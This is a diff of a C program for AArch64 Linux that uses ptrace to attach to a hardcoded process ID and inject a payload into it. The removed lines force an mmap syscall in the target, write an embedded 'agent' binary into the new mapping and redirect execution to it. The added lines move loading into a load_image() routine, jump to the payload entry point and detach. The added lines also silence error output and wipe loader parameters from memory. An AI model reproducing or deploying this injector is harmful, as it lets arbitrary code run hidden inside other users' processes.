@@ -7,128 +7,102 @@
 #include <string.h>
 #include <sys/mman.h>
 #include <sys/syscall.h>
+#include <elf.h>
 #include <sys/uio.h>
-#include <linux/elf.h>
 #include <stdint.h>
-#include "agent.h"
-#define PID 140011
+#include <errno.h>
+#include <signal.h>
+#include <unistd.h>
+#include "param_struct.h"
+// #include "agent.h"
+#define PID 64889
 #define CHECK(x) if ((x) == -1) { perror(#x); exit(1); }
 #define NT_ARM_TLS 0x401 // Ptrace flag for AArch64 TLS register
 
+static int wait_for_tracee(pid_t pid, int *status) {
+    pid_t waited;
 
-int ptrace_poketext_write(long pid, long address, const unsigned char *payload, int payload_size) {      
-    for (size_t i = 0; i < payload_size; i += sizeof(long)) {
-        long chunk = 0;
+    do {
+        waited = waitpid(pid, status, 0);
+    } while (waited == -1 && errno == EINTR);
 
-        size_t remaining = payload_size - i;
-        size_t copy_size = remaining < sizeof(long) ? remaining : sizeof(long);
-
-        if (copy_size != sizeof(long)) {
-            // read existing memory to avoid clobbering
-            chunk = ptrace(PTRACE_PEEKTEXT, pid, address + i, NULL);
-        }
-
-        memcpy(&chunk, payload + i, copy_size);
-
-        CHECK(ptrace(PTRACE_POKETEXT, pid, address + i, chunk));
+    if (waited == -1) {
+        perror("waitpid");
+        return -1;
     }
+
     return 0;
 }
 
-
 int main() {
     pid_t pid = PID;
+    int status;
 
     if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
-        perror("ptrace attach");
+        // perror("ptrace attach");
         return EXIT_FAILURE;
     }
-    waitpid(pid, NULL, 0);
 
-    struct user_pt_regs regs, backup;
-    struct iovec iov;
+    if (wait_for_tracee(pid, &status) == -1) {
+        return EXIT_FAILURE;
+    }
 
-    // 1. Backup General Purpose Registers (PC, SP, x0-x30)
-    iov.iov_base = &regs;
-    iov.iov_len = sizeof(regs);
-    CHECK(ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &iov));
-    backup = regs;
+    // struct user_pt_regs regs, backup;
+    // struct iovec iov;
 
-    // 2. Backup Thread Local Storage Register (tpidr_el0)
+    struct user_regs_struct regs, backup = {0};
+
+    struct iovec iov = {
+        .iov_base = &backup,
+        .iov_len = sizeof(backup),
+    };
+
+    // Backup general-purpose registers
+    // iov.iov_base = &regs;
+    // iov.iov_len = sizeof(regs);
+    // CHECK(ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &iov));
+    CHECK(ptrace(PTRACE_GETREGSET, pid, (void *)NT_PRSTATUS, &iov));
+    regs = backup;
+
+    // backup TLS registers
     uint64_t tls_backup = 0;
     struct iovec tls_iov;
     tls_iov.iov_base = &tls_backup;
     tls_iov.iov_len = sizeof(tls_backup);
     if (ptrace(PTRACE_GETREGSET, pid, NT_ARM_TLS, &tls_iov) == -1) {
-        perror("[-] Failed to backup TLS (Non-fatal)");
+        // perror("[-] Failed to backup TLS (Non-fatal)");
     }
 
-    // mmap
-    regs.regs[0] = 0;                      
-    regs.regs[1] = agent_len;              
-    regs.regs[2] = PROT_READ | PROT_EXEC;
-    regs.regs[3] = MAP_PRIVATE | MAP_ANONYMOUS;
-    regs.regs[4] = -1;                     
-    regs.regs[5] = 0;                      
-    regs.regs[8] = __NR_mmap;
+    // printf("[*] PC at attach: 0x%llx\n", (unsigned long long)regs.pc);
+    // printf("[*] Checking if PC page is writable...\n");
 
-    long original = ptrace(PTRACE_PEEKTEXT, pid, regs.pc, NULL);
-    CHECK(ptrace(PTRACE_POKETEXT, pid, regs.pc, 0xd4000001)); // svc 0
+    unsigned long syscall_pc = backup.pc;
 
-    CHECK(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov));
-    CHECK(ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL));
-    waitpid(pid, NULL, 0);
-
-    CHECK(ptrace(PTRACE_POKETEXT, pid, regs.pc, original));
-
-    ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &iov);
-    void *mapped_addr = (void *)regs.regs[0];
-
-    if ((long)mapped_addr < 0) {
-        printf("[-] mmap failed: %ld\n", (long)mapped_addr);
-        return -1;
-    }
-
-    // inject payload
-    regs = backup;
-    ptrace_poketext_write(pid, (long)mapped_addr, agent, agent_len);
+    //###############################
+    //LOAD IMAGE FUNCTION HERE (prob)
+    //###############################
+    struct loader_params params;
+    // params.agent = agent;
+    // params.agent_len = agent_len;
+    params.pid = pid;
+    params.regs = &regs;
+    params.syscall_pc = syscall_pc;
+    params.backup = backup;
+    params.tls_backup = tls_backup;
+    load_image(&params);
     
-    regs.pc = (unsigned long)mapped_addr;
+    regs = backup;
+    regs.pc = (unsigned long)params.entry_point;
+    regs.regs[0] = params.cleanup_ctx_addr;
 
     iov.iov_base = &regs;
     iov.iov_len = sizeof(regs);
+
+    // Tell process to continue at payload address and detatch
     CHECK(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov));
-
-    CHECK(ptrace(PTRACE_CONT, pid, NULL, NULL));
-
-    // wait for payload
-    int status;
-    while (1) {
-        waitpid(pid, &status, 0);
-        
-        // catch break point
-        if (WIFSTOPPED(status)) {
-            int sig = WSTOPSIG(status);
-            if (sig == SIGTRAP) {
-                break;
-            }
-            // Continue if stopped
-            ptrace(PTRACE_CONT, pid, NULL, sig);
-        } else if (WIFEXITED(status)) {
-            return 0;
-        }
-    }
-
-    // restore TLS
-    if (tls_backup != 0) {
-        CHECK(ptrace(PTRACE_SETREGSET, pid, NT_ARM_TLS, &tls_iov));
-    }
-
-    iov.iov_base = &backup;
-    iov.iov_len = sizeof(backup);
-    CHECK(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov));
-
-    CHECK(ptrace(PTRACE_DETACH, pid, NULL, NULL));
-    
+    memset(&params, 0, sizeof(params));
+    __asm__ __volatile__("" ::: "memory");
+    ptrace(PTRACE_DETACH, pid, NULL, NULL);
+    exit(0);
     return 0;
 }
